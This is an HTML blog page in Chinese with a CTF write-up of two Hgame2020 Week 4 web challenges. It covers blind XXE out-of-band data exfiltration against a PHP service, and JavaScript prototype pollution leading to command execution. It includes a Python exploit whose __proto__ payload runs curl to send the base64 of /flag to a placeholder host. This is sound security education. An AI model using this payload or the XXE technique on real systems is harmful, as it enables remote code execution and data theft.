@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="Hgame2020-Week4-部分WebWP"/>
+
+
+
+
+  <meta name="keywords" content="Else," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="RuoWeber">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2020/02/14/Hgame2020Week4Web(Php&Js)/"/>
+
+
+<meta name="description" content="前言寒假在家做了下今年的hgame,不管说是单从wee4或者综合来看好像比去年的简单不少。。。(但是依然觉得很难orz)。这里闲来无事先记录下week4Web的php和js的两道题">
+<meta name="keywords" content="Else">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hgame2020-Week4-部分WebWP">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;14&#x2F;Hgame2020Week4Web(Php&amp;Js)&#x2F;index.html">
+<meta property="og:site_name" content="RuoWeber">
+<meta property="og:description" content="前言寒假在家做了下今年的hgame,不管说是单从wee4或者综合来看好像比去年的简单不少。。。(但是依然觉得很难orz)。这里闲来无事先记录下week4Web的php和js的两道题">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74526727-effbd400-4f5e-11ea-9b70-e31814c6afb3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74526813-26d1ea00-4f5f-11ea-90b9-d44bf7400b8a.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74527465-b6c46380-4f60-11ea-9658-6a98769ac36b.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74527799-92b55200-4f61-11ea-9c06-b673d0518825.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74528022-24bd5a80-4f62-11ea-836d-da88b0360496.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74528161-7c5bc600-4f62-11ea-86c8-17fc0825dbd2.png">
+<meta property="og:updated_time" content="2020-03-05T07:59:41.747Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;74526727-effbd400-4f5e-11ea-9b70-e31814c6afb3.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> Hgame2020-Week4-部分WebWP - RuoWeber </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">RuoWeber</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Hgame2020-Week4-部分WebWP
+        
+      </h1>
+
+      <time class="post-time">
+          Feb 14 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>寒假在家做了下今年的hgame,不管说是单从wee4或者综合来看好像比去年的简单不少。。。(但是依然觉得很难orz)。这里闲来无事先记录下week4Web的php和js的两道题</p>
+<a id="more"></a>
+
+<h4 id="PHP-xxe盲注套娃hitcon的babyfirst-revenge"><a href="#PHP-xxe盲注套娃hitcon的babyfirst-revenge" class="headerlink" title="PHP(xxe盲注套娃hitcon的babyfirst-revenge)"></a>PHP(xxe盲注套娃hitcon的babyfirst-revenge)</h4><p>抓包一看，肯定第一想法是xxe打一梭子，发现回显有点奇怪看不懂。。。然后就想到了xxe数据外带，从网上找个exp来试下，</p>
+<p><img src="https://user-images.githubusercontent.com/34148939/74526727-effbd400-4f5e-11ea-9b70-e31814c6afb3.png" alt="">,z.dtd内容为：</p>
+<p><img src="https://user-images.githubusercontent.com/34148939/74526813-26d1ea00-4f5f-11ea-90b9-d44bf7400b8a.png" alt=""></p>
+<p>读取/flag无果后，发现/etc/hosts有个内网主机，访问下发现需要带上队伍token访问(<code>这里有一点，就是dtd中用php://filter读取时需要使用zlib.deflate压缩下，要不返回的数据太多会报错。。。</code>),带上token后访问得到的数据解压后(php://filter/read=convert.base64-encode/zlib.inflate//resource=xxx)写成html看一下,</p>
+<p>发现是hitcon的babyfirst-revenge的原题(没截图了。。)</p>
+<p>然后写个脚本去getshell(网上都有，就不展示自己的💩代码了)，</p>
+<p><img src="https://user-images.githubusercontent.com/34148939/74527465-b6c46380-4f60-11ea-9658-6a98769ac36b.png" alt=""></p>
+<p>然后发现一直没找到flag，最后再/etc下面找到。。不知道这里出题人要考什么。。。硬翻到的。</p>
+<h4 id="sekiro-js原型链污染"><a href="#sekiro-js原型链污染" class="headerlink" title="sekiro(js原型链污染)"></a>sekiro(js原型链污染)</h4><p>第一次做原型链污染的题。。。原型链污染的原理网上很多。按照我的理解就是<code>原型链污染的危害就是可以利用一些赋值操作恶意地给某个对象赋予一个恶意的属性</code>，这里漏洞其实很明显的，审计源码发现再/action路由下面</p>
+<p><img src="https://user-images.githubusercontent.com/34148939/74527799-92b55200-4f61-11ea-9c06-b673d0518825.png" alt=""></p>
+<p><img src="https://user-images.githubusercontent.com/34148939/74528022-24bd5a80-4f62-11ea-836d-da88b0360496.png" alt=""></p>
+<p>这里有了原型链污染的点，但是怎么利用这个点去getflag或者命令执行到目前还不明显，继续往下看，跟进dealwithattacks的实现，</p>
+<p><img src="https://user-images.githubusercontent.com/34148939/74528161-7c5bc600-4f62-11ea-86c8-17fc0825dbd2.png" alt=""></p>
+<p>这里发现有个函数执行语句直接拼接了变量，我们再看下attacks的数组，发现有的键值是没有additionalEffect属性的，这里就很明显了，我们通过原型链污染，给object赋值一个恶意的additionalEffect的值，sekiro.attackInfo没有这个属性的话就会遵循原型链到object，继承object的additionalEffect的值，从而实现可控的命令执行。</p>
+<p>脚本如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">baseurl = <span class="string">'http://sekiro.hgame.babelfish.ink/'</span> </span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'content-type'</span>: <span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;<span class="string">'solution'</span>:<span class="string">'123'</span>,<span class="string">'__proto__'</span>:&#123;<span class="string">"additionalEffect"</span>:<span class="string">"process.mainModule.require('child_process').exec('curl http://ip:port/`cat /flag｜base64` 0&gt;&amp;1')"</span>&#125;&#125;</span><br><span class="line">se = requests.Session()</span><br><span class="line"><span class="comment">#get /</span></span><br><span class="line">re = se.get(baseurl)</span><br><span class="line"><span class="comment">#get /info</span></span><br><span class="line">re = se.get(baseurl+<span class="string">'info'</span>)</span><br><span class="line"><span class="comment">#get /attack</span></span><br><span class="line">re = se.get(baseurl+<span class="string">'attack'</span>)</span><br><span class="line"><span class="comment">#post /action</span></span><br><span class="line">re = se.post(baseurl+<span class="string">'action'</span>,headers=header,data=json.dumps(data)).text</span><br><span class="line">print(re)</span><br></pre></td></tr></table></figure>
+
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/Else/">Else</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2020/02/20/ThinkPhp%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">ThinkPhp学习</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2020/01/29/Bytectf-BabyblogWP/">
+        <span class="next-text nav-default">Bytectf-BabyblogWP</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2020
+    <span class="footer-author">asy.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
